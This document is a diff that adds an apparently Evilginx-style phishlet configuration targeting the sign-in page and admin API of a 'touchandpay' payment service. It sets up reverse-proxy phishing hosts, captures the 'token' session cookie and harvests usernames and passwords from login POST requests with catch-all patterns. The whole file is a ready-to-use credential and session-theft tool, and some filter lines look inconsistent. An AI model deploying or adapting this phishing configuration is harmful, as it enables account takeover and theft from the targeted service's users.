@@ -1,0 +1,31 @@
+name: 'ral-hq.touchandpay.me'
+author: 'o53zu4'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'ral-hq', orig_sub: 'ral-hq', domain: 'touchandpay.me', session: false, is_landing: true, auto_filter: true}
+  - { phish_sub: 'rahq', orig_sub: 'rahq', domain: 'tapdev.site:3443', session: true, is_landing: false, auto_filter: true}
+
+sub_filters: 
+  - {triggers_on: 'ral-hq.touchandpay.com', orig_sub: 'ral-hq', domain: 'touchandpay.me', search: 'https://{hostname}/signin', replace: 'https://{hostname}/signin', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'rahq.tapdev.site:3443', orig_sub: 'rahq', domain: 'tapdev.site:3443', search: 'https://{hostname}/v1/admin/login', replace: 'https://{hostname}/v1/admin/login', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'rahq.tapdev.site:3443', orig_sub: 'rahq', domain: 'tapdev.site:3443', search: 'https://{hostname}/v1/admin/get-session', replace: 'https://{hostname}/v1/admin/get-session', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'rahq.tapdev.site:3443', orig_sub: 'rahq', domain: 'tapdev.site:3443', search: 'https://{hostname}/v1/admin/get/issuer/-/-', replace: 'https://{hostname}/v1/admin/get/issuer/-/-', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'rahq.tapdev.site:3443', orig_sub: 'rahq', domain: 'tapdev.site:3443', search: 'https://{hostname}/v1/admin/get/dashboard', replace: 'https://{hostname}/v1/admin/get/dashboard', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  
+
+auth_tokens:
+  - domain: 'rahq.tapdev.site:3443'
+    keys: ['token']
+
+creds:
+  - key: 'username'
+    search: ['(.*)']
+    type: 'post'
+  - key: 'password'
+    search: ['(.*)']
+    type: 'post'
+    
+login:
+  domain: 'ral-hq.touchandpay.me'
+  path : '/signin'
